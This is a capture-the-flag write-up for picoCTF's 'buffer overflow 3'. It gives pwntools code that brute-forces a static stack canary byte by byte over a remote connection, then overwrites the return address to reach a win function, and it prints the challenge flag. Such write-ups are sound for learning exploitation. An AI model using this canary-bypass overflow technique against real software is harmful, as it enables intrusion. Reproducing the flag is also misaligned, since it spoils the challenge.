# buffer overflow 3

### Description
> Do you think you can bypass the protection and get the flag?

### Solution
Do brute-force the canary.

```c
  41   │    char canary[CANARY_SIZE];
  42   │    char buf[BUFSIZE];
```

Efficient brute-force by overriding CANARY_SIZE from 1 to 4.

```python
while len(canary) < 4:
    for i in range(256):
        #io = process("./vuln")
        io = remote(host, port)
        io.sendlineafter("> ", "{}".format(BUFSIZE + len(canary) + 1))
        io.sendlineafter("Input> ", "A" * BUFSIZE + canary + "{}".format(chr(i)))
        if "*** Stack Smashing Detected" not in str(io.recvline()):
            canary += chr(i)
            log.info("canary: {}".format(canary))
            break
        io.close()
```

And, compose the payload using canary, which did brute-force.

```python
io = remote(host, port)
io.sendlineafter("> ", "-1")
pld = b"A"*64 + bytes(canary, 'utf-8') + b"B"*16 + p32(win)
io.sendlineafter("Input> ", pld)
print(io.recvline())

io.interactive()
```

The flag is `picoCTF{Stat1C_c4n4r13s_4R3_b4D_32625866}`

### Writer
[yu1hpa](https://twitter.com/yu1hpa)

